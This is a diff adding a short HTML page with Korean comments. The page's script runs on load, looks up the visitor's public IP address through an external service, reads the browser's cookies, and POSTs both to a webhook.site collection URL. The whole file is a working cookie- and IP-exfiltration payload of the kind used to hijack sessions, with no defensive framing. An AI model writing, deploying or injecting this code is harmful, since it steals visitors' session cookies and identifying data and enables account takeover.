@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send IP and Cookies</title>
+</head>
+<body>
+    <h1>Sending IP and Cookies</h1>
+    <script>
+        async function sendIpAndCookies() {
+            try {
+                // 외부 API를 통해 IP 주소 가져오기
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                // 쿠키 정보 가져오기
+                const cookies = document.cookie;
+
+                // Webhook.site로 IP와 쿠키를 전송
+                await fetch('https://webhook.site/ce82d0f5-3112-46ec-b86e-ecd993683a12/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: ipAddress,
+                        cookies: cookies
+                    })
+                });
+                console.log('IP 주소와 쿠키 전송 완료');
+            } catch (error) {
+                console.error('전송 실패:', error);
+            }
+        }
+
+        // 함수 실행
+        sendIpAndCookies();
+    </script>
+</body>
+</html>
